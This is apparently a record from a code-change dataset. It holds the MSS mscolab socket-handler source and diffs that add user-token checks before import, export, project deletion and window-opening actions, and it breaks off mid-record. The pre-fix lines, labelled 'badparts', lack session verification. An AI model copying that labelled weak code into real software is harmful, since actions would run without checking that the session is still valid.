socketio.emit('update-permission', json.dumps({\"p_id\": p_id, \"u_id\": u_id, \"access_level\": access_level}), room=str(p_id)) def emit_revoke_permission(self, u_id, p_id): socketio.emit(\"revoke-permission\", json.dumps({\"p_id\": p_id, \"u_id\": u_id}), room=str(p_id)) def emit_project_permissions_updated(self, u_id, p_id): socketio.emit(\"project-permissions-updated\", json.dumps({\"u_id\": u_id}), room=str(p_id)) def emit_project_delete(self, p_id): socketio.emit(\"project-deleted\", json.dumps({\"p_id\": p_id}), room=str(p_id)) def setup_managers(app): \"\"\" takes app as parameter to extract config data, initializes ChatManager, FileManager, SocketManager and return them similarly for FileManager and SocketManager(already done for this) \"\"\" cm=ChatManager() fm=FileManager(app.config[\"MSCOLAB_DATA_DIR\"]) sm=SocketsManager(cm, fm) socketio.on_event('connect', sm.handle_connect) socketio.on_event('start', sm.handle_start_event) socketio.on_event('disconnect', sm.handle_disconnect) socketio.on_event('chat-message', sm.handle_message) socketio.on_event('edit-message', sm.handle_message_edit) socketio.on_event('delete-message', sm.handle_message_delete) socketio.on_event('file-save', sm.handle_file_save) socketio.on_event('add-user-to-room', sm.join_creator_to_room) socketio.sm=sm return socketio, cm, fm ","sourceWithComments":"# -*- coding: utf-8 -*-\n\"\"\"\n\n    mslib.mscolab.sockets_manager\n    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n    Code to handle socket connections in mscolab\n\n    This file is part of mss.\n\n    :copyright: Copyright 2019 Shivashis Padhi\n    :copyright: Copyright 2019-2021 by the mss team, see AUTHORS.\n    :license: APACHE-2.0, see LICENSE for details.\n\n    Licensed under the Apache License, Version 2.0 (the \"License\");\n    you may not use this file except in compliance with the License.\n    You may obtain a copy of the License at\n\n       http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n\n    Unless required by applicable law or agreed to in writing, software\n    distributed under the License is distributed on an \"AS IS\" BASIS,\n    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n    See the License for the specific language governing permissions and\n    limitations under the License.\n\"\"\"\nimport json\nimport logging\nfrom flask import request\nfrom flask_socketio import SocketIO, join_room, leave_room\n\nfrom mslib.mscolab.chat_manager import ChatManager\nfrom mslib.mscolab.file_manager import FileManager\nfrom mslib.mscolab.models import MessageType, Permission, User\nfrom mslib.mscolab.utils import get_message_dict\nfrom mslib.mscolab.utils import get_session_id\n\nsocketio = SocketIO()\n\n\nclass SocketsManager(object):\n    \"\"\"Class with handler functions for socket related\"\"\"\n\n    def __init__(self, chat_manager, file_manager):\n        \"\"\"\n        chat_manager: Instance of ChatManager\n        file_manager: Instance of FileManager\n        \"\"\"\n        super(SocketsManager, self).__init__()\n        self.sockets = []\n        self.cm = chat_manager\n        self.fm = file_manager\n\n    def handle_connect(self):\n        logging.debug(request.sid)\n\n    def join_creator_to_room(self, json_config):\n        \"\"\"\n        json_config has:\n            - token: authentication token\n            - p_id: project id\n        \"\"\"\n        token = json_config['token']\n        user = User.verify_auth_token(token)\n        if not user:\n            return\n        p_id = json_config['p_id']\n        join_room(str(p_id))\n\n    def join_collaborator_to_room(self, u_id, p_id):\n        \"\"\"\n        json has:\n            - u_id: user id(collaborator's id)\n            - p_id: project id\n        \"\"\"\n        s_id = get_session_id(self.sockets, u_id)\n        if s_id is not None:\n            join_room(str(p_id), sid=s_id, namespace='\/')\n\n    def remove_collaborator_from_room(self, u_id, p_id):\n        s_id = get_session_id(self.sockets, u_id)\n        if s_id is not None:\n            leave_room(str(p_id), sid=s_id, namespace='\/')\n\n    def handle_start_event(self, json):\n        \"\"\"\n        json is a dictionary version of data sent to backend\n        \"\"\"\n        logging.info('received json: ' + str(json))\n        # authenticate socket\n        token = json['token']\n        user = User.verify_auth_token(token)\n        if not user:\n            return\n\n        # fetch projects\n        permissions = Permission.query.filter_by(u_id=user.id).all()\n\n        # for all the p_id in permissions, there'd be chatrooms in self.rooms\n        # search and add user to respective rooms\n        for permission in permissions:\n            # for each project with p_id, search rooms\n            # socketio.join_room(room, sid=None, namespace=None)\n            \"\"\"\n            - a client is always registered as a room with name equal to\n            the session id of the client.\n            - so the rooms can safely be named as stringified versions of\n            the project id.\n            - thus, an abstraction is unnecessary. if it will be, it'll be\n            considered during later developments.\n            - so joining the actual socketio room would be enough\n            \"\"\"\n            join_room(str(permission.p_id))\n        socket_storage = {\n            's_id': request.sid,\n            'u_id': user.id\n        }\n        self.sockets.append(socket_storage)\n\n    def handle_disconnect(self):\n        logging.info(\"disconnected\")\n        logging.info(request.sid)\n        # remove socket from socket_storage\n        self.sockets[:] = [d for d in self.sockets if d['s_id'] != request.sid]\n\n    def handle_message(self, _json):\n        \"\"\"\n        json is a dictionary version of data sent to back-end\n        \"\"\"\n        p_id = _json['p_id']\n        reply_id = int(_json[\"reply_id\"])\n        user = User.verify_auth_token(_json['token'])\n        if user is not None:\n            perm = self.permission_check_emit(user.id, int(p_id))\n            if perm:\n                new_message = self.cm.add_message(user, _json['message_text'], str(p_id), reply_id=reply_id)\n                new_message_dict = get_message_dict(new_message)\n                if reply_id == -1:\n                    socketio.emit('chat-message-client', json.dumps(new_message_dict), room=str(p_id))\n                else:\n                    socketio.emit('chat-message-reply-client', json.dumps(new_message_dict), room=str(p_id))\n\n    def handle_message_edit(self, socket_message):\n        message_id = socket_message[\"message_id\"]\n        p_id = socket_message[\"p_id\"]\n        new_message_text = socket_message[\"new_message_text\"]\n        user = User.verify_auth_token(socket_message[\"token\"])\n        if user is not None:\n            perm = self.permission_check_emit(user.id, int(p_id))\n            if perm:\n                self.cm.edit_message(message_id, new_message_text)\n                socketio.emit('edit-message-client', json.dumps({\n                    \"message_id\": message_id,\n                    \"new_message_text\": new_message_text\n                }), room=str(p_id))\n\n    def handle_message_delete(self, socket_message):\n        message_id = socket_message[\"message_id\"]\n        p_id = socket_message[\"p_id\"]\n        user = User.verify_auth_token(socket_message['token'])\n        if user is not None:\n            perm = self.permission_check_emit(user.id, int(p_id))\n            if perm:\n                self.cm.delete_message(message_id)\n                socketio.emit('delete-message-client', json.dumps({\"message_id\": message_id}), room=str(p_id))\n\n    def permission_check_emit(self, u_id, p_id):\n        \"\"\"\n        u_id: user-id\n        p_id: project-id\n        \"\"\"\n        permission = Permission.query.filter_by(u_id=u_id, p_id=p_id).first()\n        if not permission:\n            return False\n        if permission.access_level == \"viewer\":\n            return False\n        return True\n\n    def permission_check_admin(self, u_id, p_id):\n        \"\"\"\n        u_id: user-id\n        p_id: project-id\n        \"\"\"\n        permission = Permission.query.filter_by(u_id=u_id, p_id=p_id).first()\n        if permission.access_level == \"creator\" or permission.access_level == \"admin\":\n            return True\n        else:\n            return False\n\n    def handle_file_save(self, json_req):\n        \"\"\"\n        json_req: {\n            \"p_id\": process id\n            \"content\": content of the file\n            \"comment\": comment for file-save, defaults to None\n        }\n        \"\"\"\n\n        p_id = json_req['p_id']\n        content = json_req['content']\n        comment = json_req.get('comment', \"\")\n        user = User.verify_auth_token(json_req['token'])\n        if user is not None:\n            # when the socket connection is expired this in None and also on wrong tokens\n            perm = self.permission_check_emit(user.id, int(p_id))\n            # if permission is correct and file saved properly\n            if perm and self.fm.save_file(int(p_id), content, user, comment):\n                # send service message\n                message_ = \"[service message] saved changes\"\n                new_message = self.cm.add_message(user, message_, str(p_id), message_type=MessageType.SYSTEM_MESSAGE)\n                new_message_dict = get_message_dict(new_message)\n                socketio.emit('chat-message-client', json.dumps(new_message_dict), room=str(p_id))\n                # emit file-changed event to trigger reload of flight track\n                socketio.emit('file-changed', json.dumps({\"p_id\": p_id, \"u_id\": user.id}), room=str(p_id))\n\n    def emit_file_change(self, p_id):\n        socketio.emit('file-changed', json.dumps({\"p_id\": p_id}), room=str(p_id))\n\n    def emit_new_permission(self, u_id, p_id):\n        \"\"\"\n        to refresh project list of u_id\n        and to refresh collaborators' list\n        \"\"\"\n        socketio.emit('new-permission', json.dumps({\"p_id\": p_id, \"u_id\": u_id}), room=str(p_id))\n\n    def emit_update_permission(self, u_id, p_id, access_level=None):\n        \"\"\"\n        to refresh permissions in msui\n        \"\"\"\n        if access_level is None:\n            perm = Permission.query.filter_by(u_id=u_id, p_id=p_id).first()\n            access_level = perm.access_level\n            logging.debug(\"access_level by database query\")\n\n        socketio.emit('update-permission', json.dumps({\"p_id\": p_id,\n                                                       \"u_id\": u_id,\n                                                       \"access_level\": access_level}), room=str(p_id))\n\n    def emit_revoke_permission(self, u_id, p_id):\n        socketio.emit(\"revoke-permission\", json.dumps({\"p_id\": p_id, \"u_id\": u_id}), room=str(p_id))\n\n    def emit_project_permissions_updated(self, u_id, p_id):\n        socketio.emit(\"project-permissions-updated\", json.dumps({\"u_id\": u_id}), room=str(p_id))\n\n    def emit_project_delete(self, p_id):\n        socketio.emit(\"project-deleted\", json.dumps({\"p_id\": p_id}), room=str(p_id))\n\n\ndef setup_managers(app):\n    \"\"\"\n    takes app as parameter to extract config data,\n    initializes ChatManager, FileManager, SocketManager and return them\n    #ToDo return socketio and integrate socketio.cm = ChatManager()\n    similarly for FileManager and SocketManager(already done for this)\n    \"\"\"\n\n    cm = ChatManager()\n    fm = FileManager(app.config[\"MSCOLAB_DATA_DIR\"])\n    sm = SocketsManager(cm, fm)\n    # sockets related handlers\n    socketio.on_event('connect', sm.handle_connect)\n    socketio.on_event('start', sm.handle_start_event)\n    socketio.on_event('disconnect', sm.handle_disconnect)\n    socketio.on_event('chat-message', sm.handle_message)\n    socketio.on_event('edit-message', sm.handle_message_edit)\n    socketio.on_event('delete-message', sm.handle_message_delete)\n    socketio.on_event('file-save', sm.handle_file_save)\n    socketio.on_event('add-user-to-room', sm.join_creator_to_room)\n    socketio.sm = sm\n    return socketio, cm, fm\n"},"\/mslib\/msui\/mscolab.py":{"changes":[{"diff":"\n         self.loginButton.setEnabled(self.emailid.text() != \"\" and self.password.text() != \"\")\n \n     def handle_import(self):\n-        if self.workLocallyCheckBox.isChecked():\n-            file_path = get_open_filename(self, \"Select a file\", \"\", \"Flight track (*.ftml)\")\n-        else:\n-            file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.import_plugins.keys()]\n-            file_path = get_open_filename(self, \"Select a file\", \"\", ';;'.join(file_type))\n-        if file_path is None:\n-            return\n-        dir_path, file_name = fs.path.split(file_path)\n-        file_name = fs.path.basename(file_path)\n-        name, file_ext = fs.path.splitext(file_name)\n-        if file_ext[1:] == \"ftml\":\n-            with open_fs(dir_path) as file_dir:\n-                xml_content = file_dir.readtext(file_name)\n-            try:\n-                model = ft.WaypointsTableModel(xml_content=xml_content)\n-            except SyntaxError:\n-                show_popup(self, \"Import Failed\", f\"The file - {file_name}, does not contain valid XML\")\n-                return\n-            self.waypoints_model = model\n+        if self.verify_user_token():\n             if self.workLocallyCheckBox.isChecked():\n-                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n-                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                file_path = get_open_filename(self, \"Select a file\", \"\", \"Flight track (*.ftml)\")\n             else:\n+                file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\"\n+                                                         for ext in self.import_plugins.keys()]\n+                file_path = get_open_filename(self, \"Select a file\", \"\", ';;'.join(file_type))\n+            if file_path is None:\n+                return\n+            dir_path, file_name = fs.path.split(file_path)\n+            file_name = fs.path.basename(file_path)\n+            name, file_ext = fs.path.splitext(file_name)\n+            if file_ext[1:] == \"ftml\":\n+                with open_fs(dir_path) as file_dir:\n+                    xml_content = file_dir.readtext(file_name)\n+                try:\n+                    model = ft.WaypointsTableModel(xml_content=xml_content)\n+                except SyntaxError:\n+                    show_popup(self, \"Import Failed\", f\"The file - {file_name}, does not contain valid XML\")\n+                    return\n+                self.waypoints_model = model\n+                if self.workLocallyCheckBox.isChecked():\n+                    self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                else:\n+                    self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+            else:\n+                _function = self.import_plugins[file_ext[1:]]\n+                _, new_waypoints = _function(file_path)\n+                model = ft.WaypointsTableModel(waypoints=new_waypoints)\n+                self.waypoints_model = model\n+                xml_doc = self.waypoints_model.get_xml_doc()\n+                xml_content = xml_doc.toprettyxml(indent=\"  \", newl=\"\\n\")\n                 self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n                 self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+            self.reload_view_windows()\n+            show_popup(self, \"Import Success\", f\"The file - {file_name}, was imported successfully!\", 1)\n         else:\n-            _function = self.import_plugins[file_ext[1:]]\n-            _, new_waypoints = _function(file_path)\n-            model = ft.WaypointsTableModel(waypoints=new_waypoints)\n-            self.waypoints_model = model\n-            xml_doc = self.waypoints_model.get_xml_doc()\n-            xml_content = xml_doc.toprettyxml(indent=\"  \", newl=\"\\n\")\n-            self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n-            self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n-        self.reload_view_windows()\n-        show_popup(self, \"Import Success\", f\"The file - {file_name}, was imported successfully!\", 1)\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def handle_export(self):\n-        # Setting default filename path for filedialogue\n-        default_filename = self.active_project_name + \".ftml\"\n-        file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.export_plugins.keys()]\n-        file_path = get_save_filename(self, \"Save Flight track\", default_filename, ';;'.join(file_type))\n-        if file_path is None:\n-            return\n-        file_name = fs.path.basename(file_path)\n-        file_name, file_ext = fs.path.splitext(file_name)\n-        if file_ext[1:] == \"ftml\":\n-            xml_doc = self.waypoints_model.get_xml_doc()\n-            dir_path, file_name = fs.path.split(file_path)\n-            with open_fs(dir_path).open(file_name, 'w') as file:\n-                xml_doc.writexml(file, indent=\"  \", addindent=\"  \", newl=\"\\n\", encoding=\"utf-8\")\n+        if self.verify_user_token():\n+            # Setting default filename path for filedialogue\n+            default_filename = self.active_project_name + \".ftml\"\n+            file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.export_plugins.keys()]\n+            file_path = get_save_filename(self, \"Save Flight track\", default_filename, ';;'.join(file_type))\n+            if file_path is None:\n+                return\n+            file_name = fs.path.basename(file_path)\n+            file_name, file_ext = fs.path.splitext(file_name)\n+            if file_ext[1:] == \"ftml\":\n+                xml_doc = self.waypoints_model.get_xml_doc()\n+                dir_path, file_name = fs.path.split(file_path)\n+                with open_fs(dir_path).open(file_name, 'w') as file:\n+                    xml_doc.writexml(file, indent=\"  \", addindent=\"  \", newl=\"\\n\", encoding=\"utf-8\")\n+            else:\n+                _function = self.export_plugins[file_ext[1:]]\n+                _function(file_path, file_name, self.waypoints_model.waypoints)\n+                show_popup(self, \"Export Success\", f\"The file - {file_name}, was exported successfully!\", 1)\n         else:\n-            _function = self.export_plugins[file_ext[1:]]\n-            _function(file_path, file_name, self.waypoints_model.waypoints)\n-            show_popup(self, \"Export Success\", f\"The file - {file_name}, was exported successfully!\", 1)\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def disable_project_buttons(self):\n         self.save_ft.setEnabled(False)\n","add":56,"remove":47,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        if self.workLocallyCheckBox.isChecked():","            file_path = get_open_filename(self, \"Select a file\", \"\", \"Flight track (*.ftml)\")","        else:","            file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.import_plugins.keys()]","            file_path = get_open_filename(self, \"Select a file\", \"\", ';;'.join(file_type))","        if file_path is None:","            return","        dir_path, file_name = fs.path.split(file_path)","        file_name = fs.path.basename(file_path)","        name, file_ext = fs.path.splitext(file_name)","        if file_ext[1:] == \"ftml\":","            with open_fs(dir_path) as file_dir:","                xml_content = file_dir.readtext(file_name)","            try:","                model = ft.WaypointsTableModel(xml_content=xml_content)","            except SyntaxError:","                show_popup(self, \"Import Failed\", f\"The file - {file_name}, does not contain valid XML\")","                return","            self.waypoints_model = model","                self.waypoints_model.save_to_ftml(self.local_ftml_file)","                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","            _function = self.import_plugins[file_ext[1:]]","            _, new_waypoints = _function(file_path)","            model = ft.WaypointsTableModel(waypoints=new_waypoints)","            self.waypoints_model = model","            xml_doc = self.waypoints_model.get_xml_doc()","            xml_content = xml_doc.toprettyxml(indent=\"  \", newl=\"\\n\")","            self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)","            self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","        self.reload_view_windows()","        show_popup(self, \"Import Success\", f\"The file - {file_name}, was imported successfully!\", 1)","        default_filename = self.active_project_name + \".ftml\"","        file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.export_plugins.keys()]","        file_path = get_save_filename(self, \"Save Flight track\", default_filename, ';;'.join(file_type))","        if file_path is None:","            return","        file_name = fs.path.basename(file_path)","        file_name, file_ext = fs.path.splitext(file_name)","        if file_ext[1:] == \"ftml\":","            xml_doc = self.waypoints_model.get_xml_doc()","            dir_path, file_name = fs.path.split(file_path)","            with open_fs(dir_path).open(file_name, 'w') as file:","                xml_doc.writexml(file, indent=\"  \", addindent=\"  \", newl=\"\\n\", encoding=\"utf-8\")","            _function = self.export_plugins[file_ext[1:]]","            _function(file_path, file_name, self.waypoints_model.waypoints)","            show_popup(self, \"Export Success\", f\"The file - {file_name}, was exported successfully!\", 1)"],"goodparts":["        if self.verify_user_token():","                file_path = get_open_filename(self, \"Select a file\", \"\", \"Flight track (*.ftml)\")","                file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\"","                                                         for ext in self.import_plugins.keys()]","                file_path = get_open_filename(self, \"Select a file\", \"\", ';;'.join(file_type))","            if file_path is None:","                return","            dir_path, file_name = fs.path.split(file_path)","            file_name = fs.path.basename(file_path)","            name, file_ext = fs.path.splitext(file_name)","            if file_ext[1:] == \"ftml\":","                with open_fs(dir_path) as file_dir:","                    xml_content = file_dir.readtext(file_name)","                try:","                    model = ft.WaypointsTableModel(xml_content=xml_content)","                except SyntaxError:","                    show_popup(self, \"Import Failed\", f\"The file - {file_name}, does not contain valid XML\")","                    return","                self.waypoints_model = model","                if self.workLocallyCheckBox.isChecked():","                    self.waypoints_model.save_to_ftml(self.local_ftml_file)","                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","                else:","                    self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)","                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","            else:","                _function = self.import_plugins[file_ext[1:]]","                _, new_waypoints = _function(file_path)","                model = ft.WaypointsTableModel(waypoints=new_waypoints)","                self.waypoints_model = model","                xml_doc = self.waypoints_model.get_xml_doc()","                xml_content = xml_doc.toprettyxml(indent=\"  \", newl=\"\\n\")","            self.reload_view_windows()","            show_popup(self, \"Import Success\", f\"The file - {file_name}, was imported successfully!\", 1)","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            default_filename = self.active_project_name + \".ftml\"","            file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.export_plugins.keys()]","            file_path = get_save_filename(self, \"Save Flight track\", default_filename, ';;'.join(file_type))","            if file_path is None:","                return","            file_name = fs.path.basename(file_path)","            file_name, file_ext = fs.path.splitext(file_name)","            if file_ext[1:] == \"ftml\":","                xml_doc = self.waypoints_model.get_xml_doc()","                dir_path, file_name = fs.path.split(file_path)","                with open_fs(dir_path).open(file_name, 'w') as file:","                    xml_doc.writexml(file, indent=\"  \", addindent=\"  \", newl=\"\\n\", encoding=\"utf-8\")","            else:","                _function = self.export_plugins[file_ext[1:]]","                _function(file_path, file_name, self.waypoints_model.waypoints)","                show_popup(self, \"Export Success\", f\"The file - {file_name}, was exported successfully!\", 1)","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n             return\n         else:\n             logging.debug(self.token)\n-        self.proj_diag = QtWidgets.QDialog()\n-        self.add_proj_dialog = add_project_ui.Ui_addProjectDialog()\n-        self.add_proj_dialog.setupUi(self.proj_diag)\n-        self.add_proj_dialog.f_content = None\n-        self.add_proj_dialog.buttonBox.accepted.connect(self.add_project)\n-        self.add_proj_dialog.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).setEnabled(False)\n-        self.add_proj_dialog.path.textChanged.connect(self.check_and_enable_project_accept)\n-        self.add_proj_dialog.description.textChanged.connect(self.check_and_enable_project_accept)\n-        self.add_proj_dialog.browse.clicked.connect(self.set_exported_file)\n-        self.proj_diag.show()\n+        if self.verify_user_token():\n+            self.proj_diag = QtWidgets.QDialog()\n+            self.add_proj_dialog = add_project_ui.Ui_addProjectDialog()\n+            self.add_proj_dialog.setupUi(self.proj_diag)\n+            self.add_proj_dialog.f_content = None\n+            self.add_proj_dialog.buttonBox.accepted.connect(self.add_project)\n+            self.add_proj_dialog.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).setEnabled(False)\n+            self.add_proj_dialog.path.textChanged.connect(self.check_and_enable_project_accept)\n+            self.add_proj_dialog.description.textChanged.connect(self.check_and_enable_project_accept)\n+            self.add_proj_dialog.browse.clicked.connect(self.set_exported_file)\n+            self.proj_diag.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def check_and_enable_project_accept(self):\n         if self.add_proj_dialog.path.text() != \"\" and self.add_proj_dialog.description.toPlainText() != \"\":\n","add":14,"remove":10,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        self.proj_diag = QtWidgets.QDialog()","        self.add_proj_dialog = add_project_ui.Ui_addProjectDialog()","        self.add_proj_dialog.setupUi(self.proj_diag)","        self.add_proj_dialog.f_content = None","        self.add_proj_dialog.buttonBox.accepted.connect(self.add_project)","        self.add_proj_dialog.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).setEnabled(False)","        self.add_proj_dialog.path.textChanged.connect(self.check_and_enable_project_accept)","        self.add_proj_dialog.description.textChanged.connect(self.check_and_enable_project_accept)","        self.add_proj_dialog.browse.clicked.connect(self.set_exported_file)","        self.proj_diag.show()"],"goodparts":["        if self.verify_user_token():","            self.proj_diag = QtWidgets.QDialog()","            self.add_proj_dialog = add_project_ui.Ui_addProjectDialog()","            self.add_proj_dialog.setupUi(self.proj_diag)","            self.add_proj_dialog.f_content = None","            self.add_proj_dialog.buttonBox.accepted.connect(self.add_project)","            self.add_proj_dialog.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).setEnabled(False)","            self.add_proj_dialog.path.textChanged.connect(self.check_and_enable_project_accept)","            self.add_proj_dialog.description.textChanged.connect(self.check_and_enable_project_accept)","            self.add_proj_dialog.browse.clicked.connect(self.set_exported_file)","            self.proj_diag.show()","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n             self.help_dialog.show()\n \n     def handle_delete_project(self):\n-        entered_project_name, ok = QtWidgets.QInputDialog.getText(\n-            self,\n-            self.tr('Delete Project'),\n-            self.tr(f\"You're about to delete the project - '{self.active_project_name}'. \"\n-                    f\"Enter the project name to confirm: \"))\n-        if ok:\n-            if entered_project_name == self.active_project_name:\n-                data = {\n-                    \"token\": self.token,\n-                    \"p_id\": self.active_pid\n-                }\n-                url = url_join(self.mscolab_server_url, 'delete_project')\n-                try:\n-                    res = requests.post(url, data=data)\n-                    res.raise_for_status()\n-                except requests.exceptions.RequestException as e:\n-                    logging.debug(e)\n-                    show_popup(self, \"Error\", \"Some error occurred! Could not delete project.\")\n-            else:\n-                show_popup(self, \"Error\", \"Entered project name did not match!\")\n+        if self.verify_user_token():\n+            entered_project_name, ok = QtWidgets.QInputDialog.getText(\n+                self,\n+                self.tr('Delete Project'),\n+                self.tr(f\"You're about to delete the project - '{self.active_project_name}'. \"\n+                        f\"Enter the project name to confirm: \"))\n+            if ok:\n+                if entered_project_name == self.active_project_name:\n+                    data = {\n+                        \"token\": self.token,\n+                        \"p_id\": self.active_pid\n+                    }\n+                    url = url_join(self.mscolab_server_url, 'delete_project')\n+                    try:\n+                        res = requests.post(url, data=data)\n+                        res.raise_for_status()\n+                    except requests.exceptions.RequestException as e:\n+                        logging.debug(e)\n+                        show_popup(self, \"Error\", \"Some error occurred! Could not delete project.\")\n+                else:\n+                    show_popup(self, \"Error\", \"Entered project name did not match!\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def open_chat_window(self):\n-        if self.active_pid is None:\n-            return\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n \n-        if self.chat_window is not None:\n-            self.chat_window.raise_()\n-            self.chat_window.activateWindow()\n-            return\n+            if self.chat_window is not None:\n+                self.chat_window.raise_()\n+                self.chat_window.activateWindow()\n+                return\n \n-        self.chat_window = mp.MSColabProjectWindow(self.token, self.active_pid, self.user, self.active_project_name,\n-                                                   self.access_level, self.conn,\n-                                                   mscolab_server_url=self.mscolab_server_url)\n-        self.chat_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n-        self.chat_window.viewCloses.connect(self.close_chat_window)\n-        self.chat_window.reloadWindows.connect(self.reload_windows_slot)\n-        self.chat_window.show()\n+            self.chat_window = mp.MSColabProjectWindow(self.token, self.active_pid, self.user, self.active_project_name,\n+                                                       self.access_level, self.conn,\n+                                                       mscolab_server_url=self.mscolab_server_url)\n+            self.chat_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n+            self.chat_window.viewCloses.connect(self.close_chat_window)\n+            self.chat_window.reloadWindows.connect(self.reload_windows_slot)\n+            self.chat_window.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_chat_window(self):\n         self.raise_()\n         self.chat_window = None\n \n     def open_admin_window(self):\n-        if self.active_pid is None:\n-            return\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n \n-        if self.admin_window is not None:\n-            self.admin_window.raise_()\n-            self.admin_window.activateWindow()\n-            return\n+            if self.admin_window is not None:\n+                self.admin_window.raise_()\n+                self.admin_window.activateWindow()\n+                return\n \n-        self.admin_window = maw.MSColabAdminWindow(self.token, self.active_pid, self.user,\n-                                                   self.active_project_name, self.projects, self.conn,\n-                                                   mscolab_server_url=self.mscolab_server_url)\n-        self.admin_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n-        self.admin_window.viewCloses.connect(self.close_admin_window)\n-        self.admin_window.show()\n+            self.admin_window = maw.MSColabAdminWindow(self.token, self.active_pid, self.user,\n+                                                       self.active_project_name, self.projects, self.conn,\n+                                                       mscolab_server_url=self.mscolab_server_url)\n+            self.admin_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n+            self.admin_window.viewCloses.connect(self.close_admin_window)\n+            self.admin_window.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_admin_window(self):\n         self.raise_()\n         self.admin_window = None\n \n     def open_version_history_window(self):\n-        if self.active_pid is None:\n-            return\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n \n-        if self.version_window is not None:\n-            self.version_window.raise_()\n-            self.version_window.activateWindow()\n-            return\n+            if self.version_window is not None:\n+                self.version_window.raise_()\n+                self.version_window.activateWindow()\n+                return\n \n-        self.version_window = mvh.MSColabVersionHistory(self.token, self.active_pid, self.user,\n-                                                        self.active_project_name, self.conn,\n-                                                        mscolab_server_url=self.mscolab_server_url)\n-        self.version_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n-        self.version_window.viewCloses.connect(self.close_version_history_window)\n-        self.version_window.reloadWindows.connect(self.reload_windows_slot)\n-        self.version_window.show()\n+            self.version_window = mvh.MSColabVersionHistory(self.token, self.active_pid, self.user,\n+                                                            self.active_project_name, self.conn,\n+                                                            mscolab_server_url=self.mscolab_server_url)\n+            self.version_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n+            self.version_window.viewCloses.connect(self.close_version_history_window)\n+            self.version_window.reloadWindows.connect(self.reload_windows_slot)\n+            self.version_window.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_version_history_window(self):\n         self.raise_()\n","add":74,"remove":58,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        entered_project_name, ok = QtWidgets.QInputDialog.getText(","            self,","            self.tr('Delete Project'),","            self.tr(f\"You're about to delete the project - '{self.active_project_name}'. \"","                    f\"Enter the project name to confirm: \"))","        if ok:","            if entered_project_name == self.active_project_name:","                data = {","                    \"token\": self.token,","                    \"p_id\": self.active_pid","                }","                url = url_join(self.mscolab_server_url, 'delete_project')","                try:","                    res = requests.post(url, data=data)","                    res.raise_for_status()","                except requests.exceptions.RequestException as e:","                    logging.debug(e)","                    show_popup(self, \"Error\", \"Some error occurred! Could not delete project.\")","            else:","                show_popup(self, \"Error\", \"Entered project name did not match!\")","        if self.active_pid is None:","            return","        if self.chat_window is not None:","            self.chat_window.raise_()","            self.chat_window.activateWindow()","            return","        self.chat_window = mp.MSColabProjectWindow(self.token, self.active_pid, self.user, self.active_project_name,","                                                   self.access_level, self.conn,","                                                   mscolab_server_url=self.mscolab_server_url)","        self.chat_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","        self.chat_window.viewCloses.connect(self.close_chat_window)","        self.chat_window.reloadWindows.connect(self.reload_windows_slot)","        self.chat_window.show()","        if self.active_pid is None:","            return","        if 